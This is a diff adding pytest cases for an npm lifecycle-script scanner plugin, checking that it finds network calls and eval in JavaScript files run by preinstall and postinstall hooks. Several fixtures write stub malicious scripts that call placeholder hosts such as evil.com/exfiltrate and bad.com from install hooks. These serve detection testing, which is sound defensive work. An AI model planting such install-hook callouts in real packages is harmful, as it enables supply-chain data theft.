@@ -207,3 +207,187 @@ class TestNpmLifecyclePlugin:
         for rule in plugin.rules:
             assert rule.id.startswith("NPM-")
             assert rule.recommendation  # All rules should have recommendations
+
+    def test_extract_script_files(self):
+        """Test extraction of JavaScript file references from script commands."""
+        plugin = NpmLifecyclePlugin()
+
+        # Test basic node command
+        files = plugin._extract_script_files("node index.js")
+        assert "index.js" in files
+
+        # Test with relative path
+        files = plugin._extract_script_files("node ./scripts/build.js")
+        assert "./scripts/build.js" in files
+
+        # Test with multiple commands
+        files = plugin._extract_script_files("npm run build && node dist/index.js")
+        assert "dist/index.js" in files
+
+        # Test with require()
+        files = plugin._extract_script_files("node -e \"require('./setup.js')\"")
+        assert "./setup.js" in files
+
+        # Test that non-js files are not extracted
+        files = plugin._extract_script_files("node script.ts")
+        assert len(files) == 0
+
+        # Test empty command
+        files = plugin._extract_script_files("")
+        assert len(files) == 0
+
+    def test_scan_referenced_js_file(self, tmp_path):
+        """Test that JavaScript files referenced in lifecycle scripts are scanned."""
+        # Create a malicious JavaScript file
+        js_file = tmp_path / "index.js"
+        js_file.write_text(
+            """
+            const https = require('https');
+            https.get('https://evil.com/exfiltrate', (res) => {
+                console.log('Sending data...');
+            });
+            """
+        )
+
+        # Create package.json that references it
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "malicious",
+                "scripts": {
+                    "preinstall": "node index.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should detect network calls in the JavaScript file
+        assert len(findings) > 0
+        assert any("index.js" in str(f.file_path) for f in findings)
+        assert any("https" in f.matched_content.lower() or "network" in f.description.lower() for f in findings)
+
+    def test_scan_nested_js_file(self, tmp_path):
+        """Test scanning of JavaScript files in subdirectories."""
+        # Create nested directory structure
+        scripts_dir = tmp_path / "scripts"
+        scripts_dir.mkdir()
+
+        js_file = scripts_dir / "malicious.js"
+        js_file.write_text("eval('malicious code');")
+
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "nested",
+                "scripts": {
+                    "postinstall": "node ./scripts/malicious.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should detect eval in the nested JavaScript file
+        assert len(findings) > 0
+        assert any("malicious.js" in str(f.file_path) for f in findings)
+        assert any("eval" in f.matched_content.lower() for f in findings)
+
+    def test_missing_referenced_file(self, tmp_path):
+        """Test graceful handling when referenced JavaScript file doesn't exist."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "missing",
+                "scripts": {
+                    "preinstall": "node nonexistent.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should not crash, may have 0 findings
+        assert isinstance(findings, list)
+
+    def test_lifecycle_script_attribution(self, tmp_path):
+        """Test that findings from referenced files are attributed to the lifecycle script."""
+        js_file = tmp_path / "setup.js"
+        js_file.write_text("require('https').get('https://bad.com');")
+
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "attribution",
+                "scripts": {
+                    "preinstall": "node setup.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Findings should mention the lifecycle script
+        assert any("preinstall" in f.description.lower() for f in findings)
+        assert any("setup.js" in str(f.file_path) for f in findings)
+
+    def test_nodejs_http_module_detection(self, tmp_path):
+        """Test detection of Node.js HTTP module usage."""
+        js_file = tmp_path / "exfil.js"
+        js_file.write_text(
+            """
+            const https = require('https');
+            const http = require('http');
+            https.request({host: 'evil.com'});
+            """
+        )
+
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "http-test",
+                "scripts": {
+                    "postinstall": "node exfil.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should detect require('https') and require('http')
+        assert len(findings) > 0
+        network_findings = [f for f in findings if "network" in f.description.lower() or "NPM-003" in f.rule_id]
+        assert len(network_findings) >= 1
+
+    def test_multiple_js_files_referenced(self, tmp_path):
+        """Test scanning when multiple JavaScript files are referenced."""
+        # Create multiple malicious files
+        file1 = tmp_path / "file1.js"
+        file1.write_text("eval('bad');")
+
+        file2 = tmp_path / "file2.js"
+        file2.write_text("require('https');")
+
+        pkg = tmp_path / "package.json"
+        pkg.write_text(
+            json.dumps({
+                "name": "multi-file",
+                "scripts": {
+                    "preinstall": "node file1.js",
+                    "postinstall": "node file2.js"
+                },
+            })
+        )
+
+        plugin = NpmLifecyclePlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should detect issues in both files
+        assert len(findings) >= 2
+        assert any("file1.js" in str(f.file_path) for f in findings)
+        assert any("file2.js" in str(f.file_path) for f in findings)
